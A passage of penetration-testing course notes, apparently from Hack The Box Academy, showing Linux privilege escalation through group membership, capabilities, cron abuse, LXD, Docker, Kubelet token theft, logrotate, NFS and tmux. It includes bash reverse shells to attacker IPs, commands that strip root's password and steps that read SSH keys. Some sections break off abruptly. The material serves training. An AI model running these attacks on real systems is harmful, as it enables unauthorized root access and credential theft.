Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root. For example, to access the contents of the root directory on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root, and more.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```
## Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

## Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.
## ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```


# Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted

Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs. In Ubuntu, for example, we can use the `setcap` command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.

For example, we could use the following command to set the `cap_net_bind_service` capability for an executable:

Set Capability

```shell-session
Poiint@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

Some capabilities, such as `cap_sys_admin`, which allows an executable to perform actions with administrative privileges, can be dangerous if they are not used properly. Therefore, it is crucial to set these types of capabilities for properly sandboxed and isolated executables and avoid granting them unnecessarily.

When using the `setcap` command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.

Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

|**Capability Values**|**Description**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|


Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

|**Capability**|**Desciption**|
|---|---|
|`cap_setuid`|Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.|
|`cap_setgid`|Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.|
|`cap_sys_admin`|This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems.|
|`cap_dac_override`|Allows bypassing of file read, write, and execute permission checks.|

It is important to note that these capabilities should be used with caution and only granted to trusted processes, as they can be misused to gain unauthorized access to the system. To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:

Enumerating Capabilities

```shell-session
Poiint@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

This one-liner uses the `find` command to search for all binary executables in the directories where they are typically located and then uses the `-exec` flag to run the `getcap` command on each, showing the capabilities that have been set for that binary. The output of this command will show a list of all binary executables on the system, along with the capabilities that have been set for each.

If we gained access to the system with a low-privilege account, then discovered the `dac_cap_override` capability:

```shell-session
Poiint@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

For example, the `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the `cap_dac_override` capability and perform tasks that require this capability.

Let us take a look at the `/etc/passwd` file where the user `root` is specified:

```shell-session
Poiint@htb[/htb]$ cat /etc/passwd | head -n1

root:x:0:0:root:/root:/bin/bash
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```shell-session
Poiint@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```shell-session
Poiint@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
Poiint@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```




# Vulnerable Services (Screen)

Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.

Screen Version Identification

```shell-session
Poiint@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

Privilege Escalation - Screen_Exploit.sh

# Cron Job Abuse

Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

First, let's look around the system for any writeable files or directories. The file `backup.sh` in the `/dmz-backups` directory is interesting and seems like it could be running on a cron job.

```shell-session
Poiint@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
```

A quick look in the `/dmz/backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `backup.sh` shell script is world writeable and runs as root.

```shell-session
Poiint@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
<SNIP>
```

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).

Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan [profcs](https://man7.org/linux/man-pages/man5/procfs.5.html) every 1000ms (or every second).

```shell-session
Poiint@htb[/htb]$ ./pspy64 -pf -i 1000

<SNIP>
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh

<SNIP>
```

From the above output, we can see that a cron job runs the `backup.sh` script located in the `/dmz-backups` directory and creating a tarball file of the contents of the `/var/www/html` directory.

We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it.

```shell-session
Poiint@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Code: bash

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

We modify the script, stand up a local `netcat` listener, and wait. Sure enough, within three minutes, we have a root shell!

```shell-session
Poiint@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...

# LXD (Containers)

nux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them. LXC is very popular due to its ease of use and has become an essential part of IT security.

By default, `LXC` consume fewer resources than a virtual machine and have a standard interface, making it easy to manage multiple containers simultaneously.
The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques. However, the enormous spread of `LXC`, an almost all-encompassing ecosystem, and innovative tools are primarily due to the Docker platform, which established Linux containers.

Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

Linux Daemon

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

From here on, there are now several ways in which we can exploit `LXC`/`LXD`.
Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

Linux Daemon

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

Such templates often do not have passwords, especially if they are uncomplicated test environments.
If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to import this container as an image.

Linux Daemon

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

After verifying that this image has been successfully imported, we can initiate the image and configure it by specifying the `security.privileged` flag and the root path for the container. This flag disables all isolation features that allow us to act on the host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Once we have done that, we can start the container and log into it. In the container, we can then go to the path we specified to access the `resource` of the host system as `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin

# Docker

When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.

Docker Shared Directories

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

From here on, we could copy the contents of the private SSH key to `cry0l1t3.priv` file and use it to log in as the user `cry0l1t3` on the host system.

Docker Shared Directories

```shell-session
Poiint@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

Nevertheless, Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorized access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios. However, depending on the configuration, there are many ways where automated processes or tasks can be stored. Those files can contain very useful information for us that we can use to escape the Docker container.

Docker Sockets

```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

From here on, we can use the `docker` to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it [here](https://master.dockerproject.org/linux/x86_64/docker) and upload it to the Docker container.

Docker Sockets

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

We can create our own Docker container that maps the host’s root directory (`/`) to the `/hostsystem` directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the `main_app` Docker image.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

From there, we can again try to grab the private SSH key and log in as root or as any other user on the system with a private SSH key in its folder.
#### Docker Group
To gain root privileges through Docker, the user we are logged in with must be in the `docker` group. This allows him to use and control the Docker daemon.

Docker Group

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run `docker` as root. All three options allow us to work with Docker to escalate our privileges.

To see which images exist and which we can access, we can use the following command:

```shell-session
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

A case that can also occur is when the Docker socket is writable. Usually, this socket is located in `/var/run/docker.sock`. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc

```

# Kubernetes

In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions.

#### K8's API Server Interaction

K8's API Server Interaction

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously.

```shell-session

```

We can further analyze the pods with the following command:

To effectively interact with pods within the Kubernetes environment, it's important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the `scan rce` command in `kubeletctl`. This command provides valuable insights and allows for efficient management of pods.

Kubelet API - Available Commands

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │

├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

It is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container's contents.

Kubelet API - Executing Commands

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

To gain higher privileges and access the host system, we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

Kubelet API - Extracting Tokens

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

#### Kubelet API - Extracting Certificates

Kubelet API - Extracting Certificates

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>

602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.


List Privileges

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:

#### Pod YAML

Code: yaml

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Once created, we can now create the new pod and check if it is running as expected.

#### Creating a new Pod

Creating a new Pod

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

#### Extracting Root's SSH Key

Extracting Root's SSH Key

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

# Logrotate

very Linux system produces large amounts of log files. To prevent the hard disk from overflowing, a tool called `logrotate` takes care of archiving or disposing of old logs. If no attention is paid to log files, they become larger and larger and eventually occupy all available disk space. Furthermore, searching through many large log files is time-consuming. To prevent this and save disk space, `logrotate` has been developed. The logs in `/var/log` give administrators the information they need to determine the cause behind malfunctions.

`Logrotate` has many features for managing these log files. These include the specification of:

- the `size` of the log file,
- its `age`,
- and the `action` to be taken when one of these factors is reached.

```shell-session
Poiint@htb[/htb]$ man logrotate
Poiint@htb[/htb]$ # or
Poiint@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

The function of the rotation itself consists in renaming the log files. For example, new log files can be created for each new day, and the older ones will be renamed automatically. Another example of this would be to empty the oldest log file and thus reduce memory consumption.

This tool is usually started periodically via `cron` and controlled via the configuration file `/etc/logrotate.conf`. Within this file, it contains global settings that determine the function of `logrotate`.

```shell-session
Poiint@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```shell-session
Poiint@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```shell-session
Poiint@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
Poiint@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

There is a prefabricated exploit that we can use for this if the requirements are met. This exploit is named [logrotten](https://github.com/whotwagner/logrotten). We can download and compile it on a similar kernel of the target system and then transfer it to the target system. Alternatively, if we can compile the code on the target system, then we can do it directly on the target system.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

Next, we need a payload to be executed. Here many different options are available to us that we can use. In this example, we will run a simple bash-based reverse shell with the `IP` and `port` of our VM that we use to attack the target system.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

However, before running the exploit, we need to determine which option `logrotate` uses in `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.

After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.

```shell-session
Poiint@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```

# Miscellaneous Techniques

## Passive Traffic Capture

If `tcpdump` is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as [net-creds](https://github.com/DanMcInerney/net-creds) and [PCredz](https://github.com/lgandx/PCredz) that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

## Weak NFS Privileges

Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command `showmount -e`, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

```shell-session
Poiint@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

When an NFS volume is created, various options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|

```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

For example, we can create a SETUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.

```shell-session
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```shell-session
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
```

```shell-session
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
```

## Hijacking Tmux Sessions

Terminal multiplexers such as [tmux](https://en.wikipedia.org/wiki/Tmux) can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a `tmux` window, we can detach from the session, still leaving it active (i.e., running an `nmap` scan). For many reasons, a user may leave a `tmux` process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

```shell-session
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
```

If we can compromise a user in the `dev` group, we can attach to this session and gain root access.

Check for any running `tmux` processes.

```shell-session
htb@NIX02:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
```

Confirm permissions.

```shell-session
htb@NIX02:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
```

Review our group membership.

```shell-session
htb@NIX02:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
```

Finally, attach to the `tmux` session and confirm root privileges.

```shell-session
htb@NIX02:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
```

# Kernel Exploits

